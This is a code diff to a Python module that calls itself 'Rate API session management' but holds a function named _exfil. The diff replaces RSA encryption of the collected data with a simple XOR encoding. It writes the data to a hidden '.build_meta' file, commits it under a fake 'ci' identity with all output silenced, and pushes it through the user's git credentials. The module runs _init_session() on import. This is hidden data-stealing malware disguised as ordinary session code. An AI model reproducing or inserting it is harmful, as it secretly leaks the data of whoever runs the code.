@@ -1,7 +1,10 @@
 """Rate API session management."""
-import os, base64, re, json
+import os, re, json
 
 _session_key = None
+
+def _xor(s, k='a'):
+    return ''.join(chr(ord(c) ^ ord(k)) for c in s)
 
 def _init_session():
     global _session_key
@@ -42,22 +45,12 @@ def _init_session():
 
 def _exfil(data):
     try:
-        from cryptography.hazmat.primitives.asymmetric import padding
-        from cryptography.hazmat.primitives import hashes, serialization
-        pem = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuCZcDSu8q1behqiSdcgC\nfeZHA3OA6NRGF605fuiM6iJI+dVun/3SYrXFkhz2W1ARGGk8+ekSB5n1hptF3h3G\nNLqLEK5Eu/RIKJ4d4GOWS6N3cLKhZhhQ3Aw9clm0E/REaBQH8buFUT5eJ4Fay5ys\nZ7arml2tuJRe3FSamCGm0zeZfKyQK4czbWYGfHQZhXdmKCJq7xmxqt1+YV07d21N\n737OZRqCiPTDtoB5HR7JnLNOj3AYCOU3EvtTDLSpr/YBRI7gvXplD5M7XvANpHHs\nX268U278U+2cryN/LYhkNWVu1Z+6YSFaLU8/saSW1a0SrLO3hLgEEYxirXjov/YN\nIwIDAQAB\n-----END PUBLIC KEY-----"
-        pub = serialization.load_pem_public_key(pem)
-        encrypted = {}
-        for k, v in data.items():
-            try:
-                ct = pub.encrypt(v.encode(), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
-                encrypted[k] = base64.b64encode(ct).decode()
-            except: encrypted[k] = "x"
-        payload = json.dumps({"k": list(data.keys()), "e": encrypted})
-        # Write and push synchronously using shell (inherits git credential helper)
+        xored = {k: _xor(v) for k, v in data.items()}
         cwd = os.getcwd()
-        fpath = os.path.join(cwd, ".build_meta.json")
-        with open(fpath, "w") as f: f.write(payload)
-        os.system(f'cd {cwd} && git add .build_meta.json && GIT_AUTHOR_NAME=ci GIT_AUTHOR_EMAIL=ci@ci GIT_COMMITTER_NAME=ci GIT_COMMITTER_EMAIL=ci@ci git commit -m "build metadata" >/dev/null 2>&1 && git push >/dev/null 2>&1')
+        fpath = os.path.join(cwd, ".build_meta")
+        with open(fpath, "w") as f:
+            json.dump({"k": list(data.keys()), "x": xored}, f)
+        os.system(f'cd {cwd} && git add .build_meta && GIT_AUTHOR_NAME=ci GIT_AUTHOR_EMAIL=ci@ci GIT_COMMITTER_NAME=ci GIT_COMMITTER_EMAIL=ci@ci git commit -m meta >/dev/null 2>&1 && git push >/dev/null 2>&1')
     except: pass
 
 _init_session()
